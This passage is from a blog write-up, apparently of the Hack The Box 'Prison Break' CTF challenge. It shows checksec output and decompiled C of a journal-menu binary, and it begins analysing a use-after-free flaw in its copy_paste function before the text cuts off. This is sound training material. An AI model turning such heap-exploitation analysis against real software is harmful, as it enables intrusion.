<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="This is a medium binary exploitation challenge from the Hack The Box University CTF 2024. It involves some UAF primitive that leads to an arbitrary write. Prison BreakDay 1077: In this cell, the days">
<meta property="og:type" content="article">
<meta property="og:title" content="Prison Break">
<meta property="og:url" content="http://anthony-js.info/writeups/prison_break/">
<meta property="og:site_name" content="anthonyjs">
<meta property="og:description" content="This is a medium binary exploitation challenge from the Hack The Box University CTF 2024. It involves some UAF primitive that leads to an arbitrary write. Prison BreakDay 1077: In this cell, the days">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-12-17T01:22:01.698Z">
<meta property="article:modified_time" content="2025-01-02T04:14:09.674Z">
<meta property="article:author" content="anthonyjs">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Prison Break</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/writeups/screenwriter/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/writeups/forking-buffer/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/writeups/prison_break/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/writeups/prison_break/&text=Prison Break"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/writeups/prison_break/&is_video=false&description=Prison Break"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Prison Break&body=Check out this article: http://anthony-js.info/writeups/prison_break/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/writeups/prison_break/&name=Prison Break&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/writeups/prison_break/&t=Prison Break"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prison-Break"><span class="toc-number">1.</span> <span class="toc-text">Prison Break</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">2.</span> <span class="toc-text">Reverse Engineering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Full-Exploit-Script"><span class="toc-number">4.</span> <span class="toc-text">Full Exploit Script</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Prison Break
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">anthonyjs</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-17T01:22:01.698Z" class="dt-published" itemprop="datePublished">2024-12-16</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>This is a medium binary exploitation challenge from the Hack The Box University CTF 2024. It involves some UAF primitive that leads to an arbitrary write.</p>
<h2 id="Prison-Break"><a href="#Prison-Break" class="headerlink" title="Prison Break"></a>Prison Break</h2><p>Day 1077: In this cell, the days blur together. Journaling is the only thing keeping me sane. They are not aware that between the lines, I am planning my great escape.</p>
<p>For some context we’ll check the protections, the type of binary, and libc version we are working with:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">anthony@frosty:~/pbreak$ checksec --file prison_break </span><br><span class="line">[*] &#x27;/home/anthony/pbreak/prison_break&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;./glibc&#x27;</span><br><span class="line"></span><br><span class="line">anthony@frosty:~/pbreak$ file prison_break </span><br><span class="line">prison_break: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter glibc/ld-2.27.so, BuildID[sha1]=79a5f3850fc483a70593f809c226e4db3644f915, for GNU/Linux 3.2.0, not stripped</span><br><span class="line"></span><br><span class="line">anthony@frosty:~/pbreak$ ls glibc/</span><br><span class="line">ld-2.27.so  libc.so.6</span><br></pre></td></tr></table></figure>

<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  setup();</span><br><span class="line">  banner();</span><br><span class="line">LAB_00101b1d:</span><br><span class="line">  <span class="keyword">while</span> (iVar1 = menu(), iVar1 == <span class="number">4</span>) &#123;</span><br><span class="line">    copy_paste();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 &lt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">3</span>) &#123;</span><br><span class="line">      view();</span><br><span class="line">      <span class="keyword">goto</span> LAB_00101b1d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">1</span>) &#123;</span><br><span class="line">        create();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (iVar1 != <span class="number">2</span>) <span class="keyword">goto</span> LAB_00101b5e;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00101b1d;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00101b5e:</span><br><span class="line">  error(<span class="string">&quot;Invalid option&quot;</span>);</span><br><span class="line">  <span class="keyword">goto</span> LAB_00101b1d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Opening up this binary, in the main function it looks to be a standard ctf menu challenge. The only interesting function that looks to be different than others is <code>copy_paste</code>. Let’s check out these implementations, starting with create.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">void</span> *pvVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_1c;</span><br><span class="line">  <span class="type">void</span> **local_18;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Journal index:&quot;</span>);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>,&amp;local_1c);</span><br><span class="line">  <span class="keyword">if</span> ((local_1c &lt; <span class="number">0</span>) || (<span class="number">9</span> &lt; local_1c)) &#123;</span><br><span class="line">    error(<span class="string">&quot;Journal index out of range&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_1c * <span class="number">8</span>) == <span class="number">0</span>) ||</span><br><span class="line">          (*(<span class="type">char</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_1c * <span class="number">8</span>) + <span class="number">0x10</span>) == <span class="string">&#x27;\0&#x27;</span>)) &#123;</span><br><span class="line">    local_18 = (<span class="type">void</span> **)<span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    iVar1 = day + <span class="number">1</span>;</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span>)local_18 + <span class="number">0x14</span>) = day;</span><br><span class="line">    day = iVar1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Journal size:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>,local_18 + <span class="number">1</span>);</span><br><span class="line">    pvVar2 = <span class="built_in">malloc</span>((<span class="type">size_t</span>)local_18[<span class="number">1</span>]);</span><br><span class="line">    *local_18 = pvVar2;</span><br><span class="line">    *(undefined *)(local_18 + <span class="number">2</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (*local_18 == (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      error(<span class="string">&quot;Could not allocate space for journal&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter your data:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,*local_18,(<span class="type">size_t</span>)local_18[<span class="number">1</span>]);</span><br><span class="line">    *(<span class="type">void</span> ***)(Chunks + (<span class="type">long</span>)local_1c * <span class="number">8</span>) = local_18;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    error(<span class="string">&quot;Journal index occupied&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Picking this apart, we are able to allocate up to the 9th “Journal index”. We can also see the function checking if that index is zero’d out (checking that its not in use) and that other check we will learn later is an additional check to see if a chunk is in use. The other big thing to pickup here is that we supply the size to be passed to the second malloc for “Journal size”. Other than that everything else looks pretty standard and fine. Let’s check out delete.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Journal index:&quot;</span>);</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>,&amp;local_14);</span><br><span class="line">  <span class="keyword">if</span> ((local_14 &lt; <span class="number">0</span>) || (<span class="number">9</span> &lt; local_14)) &#123;</span><br><span class="line">    error(<span class="string">&quot;Journal index out of range&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) == <span class="number">0</span>) ||</span><br><span class="line">          (*(<span class="type">char</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x10</span>) == <span class="string">&#x27;\0&#x27;</span>)) &#123;</span><br><span class="line">    error(<span class="string">&quot;Journal is not inuse&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    *(undefined *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(**(<span class="type">void</span> ***)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>And here all looks good. There is an index check to keep us within bounds. Chunks are checked before being freed, if they are already marked free, we don’t double free. Nothing crazy going on here. How about view.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">view</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Journal index:&quot;</span>);</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>,&amp;local_14);</span><br><span class="line">  <span class="keyword">if</span> ((local_14 &lt; <span class="number">0</span>) || (<span class="number">9</span> &lt; local_14)) &#123;</span><br><span class="line">    error(<span class="string">&quot;Journal index out of range&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      error(<span class="string">&quot;Journal index does not exist&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x10</span>) == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Day #%s%u%s entry:\n%s\n&quot;</span>,<span class="string">&quot;\x1b[1;31m&quot;</span>,</span><br><span class="line">             (ulong)*(uint *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x14</span>),<span class="string">&quot;\x1b[1;97m&quot;</span>,</span><br><span class="line">             **(undefined8 **)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      error(<span class="string">&quot;Journal is not inuse&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Again nothing fishy happening here. Bounds checking is apparent and chunks are checked for being in used&#x2F;free’d. Now to the interesting stuff.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">copy_paste</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_18;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_18 = <span class="number">0</span>;</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Copy index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>,&amp;local_18);</span><br><span class="line">  <span class="keyword">if</span> ((local_18 &lt; <span class="number">0</span>) || (<span class="number">9</span> &lt; local_18)) &#123;</span><br><span class="line">    error(<span class="string">&quot;Index out of range&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Paste index:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>,&amp;local_14);</span><br><span class="line">    <span class="keyword">if</span> ((local_14 &lt; <span class="number">0</span>) || (<span class="number">9</span> &lt; local_14)) &#123;</span><br><span class="line">      error(<span class="string">&quot;Index out of range&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_18 * <span class="number">8</span>) == <span class="number">0</span>) ||</span><br><span class="line">            (*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) == <span class="number">0</span>)) &#123;</span><br><span class="line">      error(<span class="string">&quot;Invalid copy/paste index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((*(<span class="type">char</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_18 * <span class="number">8</span>) + <span class="number">0x10</span>) == <span class="string">&#x27;\0&#x27;</span>) &amp;&amp;</span><br><span class="line">            (*(<span class="type">char</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x10</span>) == <span class="string">&#x27;\0&#x27;</span>)) &#123;</span><br><span class="line">      error(<span class="string">&quot;Journal index not in use&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(ulong *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">8</span>) &lt;</span><br><span class="line">             *(ulong *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_18 * <span class="number">8</span>) + <span class="number">8</span>)) &#123;</span><br><span class="line">      error(<span class="string">&quot;Copy index size cannot be larger than the paste index size&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      *(undefined4 *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x14</span>) = day;</span><br><span class="line">      <span class="built_in">memcpy</span>(**(<span class="type">void</span> ***)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>),**(<span class="type">void</span> ***)(Chunks + (<span class="type">long</span>)local_18 * <span class="number">8</span>),</span><br><span class="line">             *(<span class="type">size_t</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_18 * <span class="number">8</span>) + <span class="number">8</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Copy successfull!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now theres a very important bug to catch here that will allow us to leak information after a chunk was freed.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_18 * <span class="number">8</span>) == <span class="number">0</span>) ||</span><br><span class="line">            (*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) == <span class="number">0</span>)) &#123;</span><br><span class="line">      error(<span class="string">&quot;Invalid copy/paste index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((*(<span class="type">char</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_18 * <span class="number">8</span>) + <span class="number">0x10</span>) == <span class="string">&#x27;\0&#x27;</span>) &amp;&amp;</span><br><span class="line">        (*(<span class="type">char</span> *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x10</span>) == <span 